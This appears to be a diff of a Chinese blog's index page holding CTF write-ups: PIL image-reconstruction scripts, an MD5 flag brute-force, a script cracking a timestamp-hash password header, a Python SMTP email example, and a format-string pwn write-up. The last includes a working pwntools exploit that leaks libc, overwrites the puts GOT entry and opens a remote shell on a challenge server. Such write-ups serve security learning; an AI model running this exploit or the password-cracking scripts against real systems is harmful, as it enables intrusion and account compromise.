+<p>images  =  Image.new(‘RGB’,(x,y))  #创建一个image对象，参数有’RGB’,图片长宽，以及背景色，这道题给出了每个坐标的RGB，所以不需要设置背景色</p>
+<p>#images = Image.new(‘RGB’,(x,y),’#ffffff’)</p>
+<p>with  open  (‘bug.txt’,’r’)  as  f:<br>    for  i  in  range  (x):<br>        for  j  in  range  (y):<br>            n  =  f.readline()<br>            rgb  =  n.split(‘,’)</p>
+<pre><code>images.putpixel((i,j),(int  (rgb[0]),int  (rgb[1]),int  (rgb[2])))  #绘图，images的putpixel方法需要坐标以及三原色</code></pre><p>images.show()  #显示出来(不保存)</p>
+<p>#images.save(‘bugkuctf.png’) #(保存)</p>
+<h5 id="运行截图："><a href="#运行截图：" class="headerlink" title="运行截图："></a><strong>运行截图：</strong></h5><p><img src="/2019/09/10/Python/PythonPIL简单编程/_resources/447d548b2e43651226ad793a7a9183ea.png" alt></p>
+<h4 id="以实验吧-安全杂项-Paint-amp-Scan为例："><a href="#以实验吧-安全杂项-Paint-amp-Scan为例：" class="headerlink" title="以实验吧 安全杂项 Paint&amp;Scan为例："></a><strong>以实验吧 安全杂项 Paint&amp;Scan为例：</strong></h4><h5 id="该题数据类似：-1"><a href="#该题数据类似：-1" class="headerlink" title="该题数据类似："></a><strong>该题数据类似：</strong></h5><p>//其给的是需要涂黑的坐标<br>(95,10)<br>(96,10)<br>(97,10)<br>(98,10)<br>(99,10)<br>(154,10)<br>(155,10)<br>(156,10)<br>(157,10)<br>(158,10)<br>(159,10)<br>(160,10)<br>(161,10)</p>
+<h5 id="脚本如下："><a href="#脚本如下：" class="headerlink" title="脚本如下："></a><strong>脚本如下：</strong></h5><p>from  PIL  import  Image,ImageDraw</p>
+<p>images  =  Image.new(‘RGB’,(280,280),’#ffffff’)</p>
+<p>#imagesDraw = ImageDraw.Draw(images,’RGB’) #新建imagesDraw对象</p>
+<p>with  open(‘qr.txt’,’r’)  as  f:<br>    for  n  in  f.readlines():<br>        n  =  n[1:-2]<br>        n  =  n.split(‘,’)<br>        n[0] =  int(n[0])<br>        n[1] =  int(n[1])<br>        #imagesDraw.point(tuple(n),’#000000’) 在该坐标上涂黑，参数为：坐标元组，颜色<br>        images.putpixel((n[0],n[1]),(0,0,0))</p>
+<p>#images.save(‘solve.png’)<br>images.show()</p>
+<h5 id="运行截图：-1"><a href="#运行截图：-1" class="headerlink" title="运行截图："></a><strong>运行截图：</strong></h5><p><img src="/2019/09/10/Python/PythonPIL简单编程/_resources/f790b2a5d4e50b4489da36665470bdc0.png" alt="1535601662203.png"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/PythonPIL简单编程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/PythonHash" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>PythonHash</p>
+<h4 id="PythonHash"><a href="#PythonHash" class="headerlink" title="PythonHash"></a><strong>PythonHash</strong></h4><p>以<strong>实验吧 密码学 ROT-13变身了</strong>为例：</p>
+<p>先rot13(ord(‘F’) - 83 = 13)下，拿到 flag{www_shiyanbar_com_is_very_good_xxxx}<br>import  hashlib,sys</p>
+<p>#38e4c352809e150186920aac37190cbc</p>
+<p>arr  =  ‘flag{www_shiyanbar_com_is_very_good_’<br>count  =  0<br>print  ‘Run.’,</p>
+<p>dict  =  ‘!”#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~]’</p>
+<p>for  a  in  dict:<br>    for  b  in  dict:<br>        for  c  in  dict:<br>            for  d  in  dict:<br>                count  +=  1<br>                if  count  %  1000000  ==  0:<br>                    print  ‘.’,</p>
+<pre><code>md5  =  hashlib.md5((arr+a+b+c+d+&apos;}&apos;).encode(&apos;utf-8&apos;)).hexdigest()#hashlib.md5(str.encode(&apos;utf-8&apos;)).hexdigest()
+
+if  md5  ==  &apos;38e4c352809e150186920aac37190cbc&apos;:
+    print  &apos;\n[*] &apos;,
+    print  md5,
+    print  arr+a+b+c+d+&apos;}&apos;
+    sys.exit(0)</code></pre><p>import requests<br>import hashlib<br>import time</p>
+<p>url = ‘<a href="http://www.iloveflag.com:8002/index.php&#39;" target="_blank" rel="noopener">http://www.iloveflag.com:8002/index.php&#39;</a></p>
+<p>s = requests.Session()<br>response = s.get(url)<br>head = response.headers<br>print head<br>password = head[‘password’].split(‘:’)[0]</p>
+<p>print password<br>password1 = password<br>cont = 1540110000<br>for i in range(10000):<br>    md = hashlib.md5()<br>    md.update(str(cont).encode())<br>    #print str(cont),md.hexdigest()<br>    if (md.hexdigest() in password):<br>        print str(cont),<br>        password1 = str(cont)<br>        print(md.hexdigest())<br>        break<br>    cont = cont + 1</p>
+<p>print ‘end’</p>
+<p>md = hashlib.md5()<br>md.update(str(int(password1) + 1).encode())<br>print int(password1)+1,md.hexdigest()<br>time.sleep(1)<br>postdata = {‘password’:str(int(password1) + 1),’submit_password’:’’}<br>result = s.post(url=url,data = postdata)<br>head = result.headers<br>print head,result.text</p>
+<h1 id="for-i-in-range-1000"><a href="#for-i-in-range-1000" class="headerlink" title="for i in range (1000):"></a>for i in range (1000):</h1><h1 id="postdata-‘password’-str-int-password1-20-’submit-password’-’’"><a href="#postdata-‘password’-str-int-password1-20-’submit-password’-’’" class="headerlink" title="postdata = {‘password’:str(int(password1) + 20),’submit_password’:’’}"></a>postdata = {‘password’:str(int(password1) + 20),’submit_password’:’’}</h1><h1 id="result-s-post-url-url-data-postdata"><a href="#result-s-post-url-url-data-postdata" class="headerlink" title="result = s.post(url=url,data = postdata)"></a>result = s.post(url=url,data = postdata)</h1><h1 id="head-result-headers"><a href="#head-result-headers" class="headerlink" title="head = result.headers"></a>head = result.headers</h1><h1 id="print-head"><a href="#print-head" class="headerlink" title="print head"></a>print head</h1><h1 id="print-result-text"><a href="#print-result-text" class="headerlink" title="print result.text"></a>print result.text</h1><h1 id="if-‘flag’-in-result-or-‘flag’-in-head"><a href="#if-‘flag’-in-result-or-‘flag’-in-head" class="headerlink" title="if ‘flag’ in result or ‘flag’ in head:"></a>if ‘flag’ in result or ‘flag’ in head:</h1><h1 id="break"><a href="#break" class="headerlink" title="break"></a>break</h1><h1 id="print-‘end’"><a href="#print-‘end’" class="headerlink" title="print ‘end’"></a>print ‘end’</h1>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/PythonHash/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/Python 邮件编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Python 邮件编程</p>
+<h3 id="Python-邮件编程"><a href="#Python-邮件编程" class="headerlink" title="Python 邮件编程"></a><strong>Python 邮件编程</strong></h3><p>#coding: utf-8<br>import  smtplib<br>from  email.mime.text  import  MIMEText<br>from  email.header  import  Header<br>from  email.mime.multipart  import  MIMEMultipart</p>
+<h1 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h1><h1 id="smtp服务器"><a href="#smtp服务器" class="headerlink" title="smtp服务器"></a>smtp服务器</h1><p>host  =  “<a href="http://smtp.qq.com/" target="_blank" rel="noopener">smtp.qq.com</a>“<br>sender  =  “<a href="mailto:1669630940@qq.com" target="_blank" rel="noopener">xxxxxxx@qq.com</a>“</p>
+<p>receivers  = [“<a href="mailto:1669630940@qq.com" target="_blank" rel="noopener">xxxxxxx@qq.com</a>“,”<a href="mailto:1669630940@qq.com" target="_blank" rel="noopener">xxxxxxx@qq.com</a>“,”<a href="mailto:1669630940@qq.com" target="_blank" rel="noopener">xxxxxxx@qq.com</a>“,”<a href="mailto:1669630940@qq.com" target="_blank" rel="noopener">xxxxxxx@qq.com</a>“]</p>
+<h1 id="密码，非邮箱密码"><a href="#密码，非邮箱密码" class="headerlink" title="密码，非邮箱密码"></a>密码，非邮箱密码</h1><p>password  =  “xxxxxxxxxxxxxxxx”</p>
+<h1 id="带附件的邮件实例"><a href="#带附件的邮件实例" class="headerlink" title="带附件的邮件实例"></a>带附件的邮件实例</h1><p>message  =  MIMEMultipart()</p>
+<h1 id="不带附件的邮件实例"><a href="#不带附件的邮件实例" class="headerlink" title="不带附件的邮件实例"></a>不带附件的邮件实例</h1><h1 id="message-MIMEText-msg-’html’-’utf-8’"><a href="#message-MIMEText-msg-’html’-’utf-8’" class="headerlink" title="message = MIMEText(msg,’html’,’utf-8’)"></a>message = MIMEText(msg,’html’,’utf-8’)</h1><p>#msg = “””</p>
+<p>#</p><p>电子邮件内容</p><p></p>
+<p>#</p><p><a href="[http://www.baidu.com](http://www.baidu.com/)">百度搜索</a></p><p></p>
+<p>#”””</p>
+<h1 id="另一种写法"><a href="#另一种写法" class="headerlink" title="另一种写法"></a>另一种写法</h1><p>message.attach(MIMEText(‘</p><p>电子邮件内容</p><p><a href="[http://www.baidu.com](http://www.baidu.com/)">百度搜索</a></p>‘,’html’,’utf-8’))<p></p>
+<h1 id="message-attach-MIMEText-‘电子邮件内容百度搜索‘-’plain’-’utf-8’"><a href="#message-attach-MIMEText-‘电子邮件内容百度搜索‘-’plain’-’utf-8’" class="headerlink" title="message.attach(MIMEText(‘电子邮件内容百度搜索‘,’plain’,’utf-8’))"></a>message.attach(MIMEText(‘<p>电子邮件内容</p><p><a href="[http://www.baidu.com](http://www.baidu.com/)">百度搜索</a></p>‘,’plain’,’utf-8’))</h1><h1 id="两个附件"><a href="#两个附件" class="headerlink" title="两个附件"></a>两个附件</h1><p>attr1  =  MIMEText(open(‘1.jpg’,’rb’).read(),’base64’,’utf-8’)<br>attr1[“Content-Type”] =  “application/octet-stream”<br>attr1[“Content-Disposition”] =  “attachment; filename=’1.jpg’”</p>
+<p>attr2  =  MIMEText(open(‘2.jpg’,’rb’).read(),’base64’,’utf-8’)<br>attr2[“Content-Type”] =  “application/octet-stream”<br>attr2[“Content-Disposition”] =  “attachment; filename=’2.jpg’”</p>
+<p>message[‘From’] =  Header(“测试”,’utf-8’)<br>message[‘To’] =  Header(“测试”,”utf-8”)<br>message.attach(attr1)<br>message.attach(attr2)</p>
+<p>subject  =  ‘测试’<br>message[‘Subject’] =  Header(subject,”utf-8”)</p>
+<p>try:<br>    # 465为下述图片中smtp服务器使用SSL的端口号，587不对<br>    smtpObj  =  smtplib.SMTP_SSL(host,465)<br>    smtpObj.login(sender,password)<br>    smtpObj.sendmail(sender,receivers,message.as_string())<br>    print  ‘发送成功’</p>
+<p>except  Exception  as  e:<br>    print  e<br><img src="/2019/09/10/Python/Python 邮件编程/_resources/c49ccdee083d384653faa8cdec824f61.png" alt="1564044086968.png"><br><img src="/2019/09/10/Python/Python 邮件编程/_resources/d6e62c7ca1858b27e077ea617a621e54.png" alt="1564044557919.png"></p>
+<p>测试结果如下：<br><img src="/2019/09/10/Python/Python 邮件编程/_resources/e5b834ba43103962b14a41c0b4d79bc3.png" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/Python 邮件编程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PWN/格式化字符串漏洞利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>格式化字符串漏洞利用</p>
+<h4 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a><strong>格式化字符串漏洞利用</strong></h4><p>以<strong>实验吧 printf</strong>为例：<br><strong>漏洞利用思路</strong>：</p>
+<ol>
+<li>注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址</li>
+<li>将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’</li>
+<li>在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/19a4a1a3fbdeaebe9be40c9bb7048e88.png" alt><br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/79076a875c0be0f6d97d4c473253830b.png" alt><br>使用<strong>objdump</strong>得到想要的信息：<br>拿到<strong>puts的got表地址</strong>：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/12f365ca9d4c0974c5c199fc01c77ad1.png" alt><br>拿到他们<strong>在libc中的偏移</strong>：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/3b2274e6c5035e053d8ae71843504655.png" alt><br>找见<strong>可控字段</strong>：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/3e106ca9b4c77a52be5e124bc8b9a7b2.png" alt></li>
+</ol>
+<p><strong>偏移量</strong>为：(0xd24c-0xd230)/4 = 7<br>利用printf打印出puts的got表中对应的真实的puts地址，使用其计算得到真实的system地址</p>
+<p><strong>计算方法</strong>如下：<br>addr_libc = addr_puts - offset_puts<br>addr_system = addr_libc + offset_system<br>利用%n覆写puts的got表地址，拿到shell</p>
+<p><strong>exp</strong>如下：</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from  pwn  import  *</p>
+<p>def  puts_file(io,  name,content):<br>    io.recvuntil(‘ftp&gt;’)<br>    io.sendline(‘put’)<br>    io.recvuntil(‘upload:’)<br>    io.sendline(name)<br>    io.recvuntil(‘content:’)<br>    io.sendline(content)</p>
+<p>def  get_file(io,  name):<br>    io.recvuntil(‘ftp&gt;’)<br>    io.sendline(‘get’)<br>    io.recvuntil(‘get:’)<br>    io.sendline(name)</p>
+<p>def  dir_file(io):<br>    io.recvuntil(‘ftp&gt;’)<br>    io.sendline(‘dir’)</p>
+<p>def  pwn(io):<br>    print  ‘Start!’<br>    fake_username  =  ‘sysbdmin’<br>    real_username  =  ‘’<br>    #计算出真实的用户名<br>    for  i  in  fake_username:<br>        real_username  +=  chr(ord(i)  -  1)<br>    io.recvuntil(‘Name (ftp.hacker.server:Rainism):’)<br>    io.sendline(real_username)<br>    print  ‘[<em>] real_username : ‘,real_username<br>    #得到puts的got表地址<br>    got_puts  =  0x0804a028<br>    #得到puts的偏移量<br>    offset_puts  =  0x5fca0<br>    content  =  p32(got_puts)  +  ‘%7$s…’<br>    #构造之后system调用的参数(“/bin/sh”)<br>    name  =  ‘/sh’<br>    puts_file(io,  name,  content)<br>    get_file(io,  name)<br>    #利用printf的格式化字符串漏洞打印出真实的puts地址<br>    data  =  io.recvuntil(‘…’)[0:]<br>    addr_puts  =  u32(data[4:8])<br><br>    print  ‘[</em>] addr_puts: ‘,hex(addr_puts)<br>    #计算libc的基址<br>    addr_libc  =  addr_puts  -  offset_puts<br>    offset_system  =  0x3ada0<br>    #计算system的真实地址<br>    addr_system  =  addr_libc  +  offset_system<br>    print  ‘[<em>] addr_system: ‘,hex(addr_system)<br><br>    addr_info  =  ‘’<br>    padding_info  =  ‘’<br>    #覆盖puts的got表地址<br>    system_addr_buff  =  p32(addr_system)<br>    begin_index  =  7<br>    offset  =  16<br>    for  i  in  range(4):<br>        addr_info  +=  p32(got_puts  +  i)<br>        val  =  ord(system_addr_buff[i])<br>        count  =  val  -  offset<br>        if  count  &lt;  0  :<br>            count  +=  0x100<br><br>        padding_info  +=  ‘%%%dc’  %  count  +  ‘%%%d$hhn’  %  (begin_index  +  i)<br><br>        offset  =  val<br>    print  ‘[</em>] Start Attacking!’<br>    #与之前创建的文件名组成了system的参数(“/bin/sh”)<br>    name  =  ‘/bin’<br>    content  =  addr_info  +  padding_info<br>    puts_file(io,  name,  content)<br>    print  ‘[<em>] puts_file succeed!’<br>    get_file(io,  name)<br>    print  ‘[</em>] get_file succeed!’<br>    dir_file(io)<br>    print  ‘[*] dir_file succeed!’<br>    io.interactive()</p>
+<p>def  main():<br>    io  =  remote(‘106.2.25.7’,8001)<br>    pwn(io)</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()<br><strong>运行结果</strong>如下：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/1f07ab3fcea14d0a0bd825f8e810efb4.png" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/格式化字符串漏洞利用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 
 
@@ -411,10 +877,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">rop,pwn</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
